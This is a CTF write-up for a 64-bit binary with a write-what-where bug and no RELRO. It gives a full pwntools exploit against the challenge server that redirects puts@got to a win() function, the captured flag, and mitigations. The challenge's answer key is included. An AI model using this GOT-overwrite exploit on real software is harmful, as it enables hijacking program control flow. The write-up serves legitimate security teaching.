# Show me what you GOT! - PWN Challenge Writeup

## Challenge Information

**Name:** Show me what you GOT!
**Category:** PWN / Binary Exploitation
**Difficulty:** Easy-Medium
**Service:** nc chall.0xfun.org 24263
**Description:** "Bring it on! Show me EVERYTHING you've got! I want to see all you've got!"

## Reconnaissance

### Binary Analysis

```bash
file chall
# chall: ELF 64-bit LSB executable, x86-64

checksec chall
# Arch:       amd64-64-little
# RELRO:      No RELRO          <- GOT fully writable
# Stack:      Canary found      <- Stack protected
# NX:         NX enabled        <- Non-executable stack
# PIE:        No PIE (0x400000) <- Fixed addresses
# Stripped:   No                <- Symbols present
```

**Protection analysis:**
- **No RELRO** -> GOT fully writable!
- Stack Canary -> Cannot easily do buffer overflow
- NX enabled -> No shellcode on stack
- No PIE -> Hardcoded addresses
- Not stripped -> Symbols and functions visible

The challenge name "Show me what you GOT!" is a direct hint towards the **Global Offset Table (GOT)**.

### Service Interaction

```bash
$ nc chall.0xfun.org 24263
Show me what you GOT!
123456
Show me what you GOT! I want to see what you GOT!
789012
Goodbye!
```

The program asks for two integers.

## Static Analysis

### Available Functions

```bash
r2 -A chall
afl
```

Important functions:
- `main` (0x401310)
- **`win`** (0x401236) <- Win function that reads flag.txt!

### Analysis of main()

Disassembling `main`:

```c
void main() {
    uint64_t val1, val2;

    setbuf(stdout, NULL);
    puts("Show me what you GOT!");
    scanf("%lu", &val1);  // Reads first number

    puts("Show me what you GOT! I want to see what you GOT!");
    scanf("%lu", &val2);  // Reads second number

    *(uint64_t *)val1 = val2;  // <- WRITE-WHAT-WHERE!

    puts("Goodbye!");
    return 0;
}
```

**Critical vulnerability:** `mov qword [rdx], rax` at `0x40139e`

- `rdx` contains the first number (write address)
- `rax` contains the second number (value to write)
- **Arbitrary Write**: We can write any value to any memory address

### Analysis of win()

```c
void win() {
    FILE *fp;
    char buffer[64];

    fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        perror("Failed to open flag.txt");
        exit(1);
    }

    fread(buffer, 1, 64, fp);
    printf("I like what you GOT! Take this: %s.\n", buffer);
    exit(0);
}
```

Perfect function! Reads and displays the flag.

## Exploitation Strategy

### Attack Plan

Since we have **arbitrary write** and **No RELRO**, we can overwrite GOT entries:

1. Identify a function that is called after the write
2. Overwrite its GOT entry with the address of `win()`
3. When that function is called, it will execute `win()` instead
4. Get the flag

### Target Selection

After the arbitrary write, `main` calls `puts("Goodbye!")`.

**Target:** `puts@got`

```python
from pwn import *

elf = ELF('./chall')

win_addr = elf.symbols['win']    # 0x401236
puts_got = elf.got['puts']       # 0x403430
```

### Exploit Construction

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

elf = ELF('./chall')

win_addr = elf.symbols['win']  # 0x401236
puts_got = elf.got['puts']     # 0x403430

p = remote('chall.0xfun.org', 24263)

p.recvuntil(b'!')

# Input 1: Address to write to (puts@got)
p.sendline(str(puts_got).encode())

p.recvuntil(b'!')

# Input 2: Value to write (win address)
p.sendline(str(win_addr).encode())

# When main calls puts("Goodbye!"),
# it will execute win() instead
print(p.recvall().decode())
```

### Exploitation Flow

1. **Input 1:** We send `4207664` (0x403430 = puts@got)
2. **Input 2:** We send `4198966` (0x401236 = win)
3. **Execution:** `mov [0x403430], 0x401236` overwrites puts@got
4. **Trigger:** `puts("Goodbye!")` -> executes `win()`
5. **Win:** `win()` reads and displays flag.txt

## Obtaining the Flag

```bash
$ python3 exploit.py
[*] win() address: 0x401236
[*] puts@got address: 0x403430
[+] Opening connection to chall.0xfun.org on port 24263: Done
[+] Waiting for flag...

I like what you GOT! Take this: 0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}.
```

## FLAG

```
0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}
```

## Technical Summary

**Vulnerability:** Arbitrary Write (write-what-where)

```c
// In main():
scanf("%lu", &address);
scanf("%lu", &value);
*(uint64_t *)address = value;  // <- No validation
```

**Attack vector:** GOT Overwrite

**Technique used:**
1. Arbitrary write exploit to overwrite GOT
2. Target: `puts@got` -> address of `win()`
3. Protection bypass using a legitimate binary function

**Bypassed protections:**
- Stack Canary: Irrelevant (we don't do stack overflow)
- NX: Irrelevant (we don't inject shellcode)
- No RELRO: Allows GOT overwrite

**Why does it work?**

```
Before exploit:
puts@got -> libc_puts (address in libc)

After exploit:
puts@got -> win (0x401236)

When main calls puts("Goodbye!"):
call [puts@got] -> call win -> FLAG!
```

## Key Concepts

### Global Offset Table (GOT)

The GOT is a table containing addresses of dynamically linked library functions:

```
GOT Entry        Address
-----------      ---------
puts@got         0x7f... -> libc_puts
printf@got       0x7f... -> libc_printf
exit@got         0x7f... -> libc_exit
```

With **No RELRO**, this table is **writable** throughout the entire execution.

### Arbitrary Write

When a program allows writing an arbitrary value to an arbitrary address controlled by the attacker:

```c
void vuln() {
    uint64_t *where;
    uint64_t what;

    scanf("%lu", &where);  // Attacker controls
    scanf("%lu", &what);   // Attacker controls
    *where = what;         // <- Arbitrary write
}
```

### RELRO (Relocation Read-Only)

| RELRO | GOT Writable | GOT Read-Only |
|-------|--------------|---------------|
| No RELRO | Always | Never |
| Partial RELRO | Always | Never |
| Full RELRO | Never | Always |

This binary has **No RELRO** -> GOT fully writable.

## Alternative Exploitation Approaches

### Option 1: Overwrite exit@got

```python
exit_got = elf.got['exit']
# Problem: exit is called from win(), not from main
# Would not work correctly
```

### Option 2: Overwrite printf@got

```python
printf_got = elf.got['printf']
# Problem: printf is not called after the write in main
# Would not be triggered
```

### Option 3: Overwrite puts@got

```python
puts_got = elf.got['puts']
# Perfect! puts("Goodbye!") is called right after the write
```

## Lessons Learned

1. **Validate user input:** Never trust user values for memory addresses
2. **RELRO:** Enable **Full RELRO** to protect the GOT
3. **No RELRO is critical:** Allows trivial GOT overwrite
4. **Win functions:** Greatly simplify exploitation in CTFs

## Mitigations

```c
// Vulnerable code:
scanf("%lu", &addr);
scanf("%lu", &val);
*(uint64_t *)addr = val;  // <- No validation

// Secure code:
// Do not allow arbitrary writes controlled by user
// If necessary, validate allowed address ranges
```

**Secure compilation:**
```bash
gcc -o chall chall.c -z relro -z now  # Full RELRO
```

## Tools Used

- `checksec` - Protection verification
- `radare2` - Static analysis and disassembly
- `pwntools` - Exploitation framework
- `GDB` - Dynamic debugging (optional)

## References

- [GOT and PLT for pwning](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)
- [RELRO - ELF format security](https://ctf101.org/binary-exploitation/relocation-read-only/)
- [Pwntools Documentation](https://docs.pwntools.com/)

---

**Author:** Claude
**Date:** 2026-02-13
**CTF:** 0xfun CTF
**Category:** PWN
**Difficulty:** 2/5
